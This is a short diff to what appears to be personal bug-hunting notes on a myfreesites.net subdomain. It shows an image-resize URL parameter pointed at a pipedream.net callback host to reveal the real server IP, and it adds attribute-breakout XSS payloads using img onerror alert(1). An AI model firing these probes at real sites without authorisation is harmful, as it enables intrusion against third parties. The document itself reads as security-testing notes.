@@ -314,3 +314,12 @@ makro.myfreesites.net ------> our IP or pipedreams.net
 https://makro2024.myfreesites.net/s/cdn/v1.0/i/m?url=https://eotblbpp2cc5exq.m.pipedream.net&methods=resize%2C500%2C5000
 
 Finally, we can see REAL webserver IP and RFI is in url parameter.
+____________________________________________________________________________________________________________________________________________
+Two types of XSS ("> in back and front)
+----------------------------------------
+
+value="leebl"> (original)
+
+value=""><img src=x onerror=alert(1)>">
+
+value="leebl"><img src=x onerror=alert(1)>">
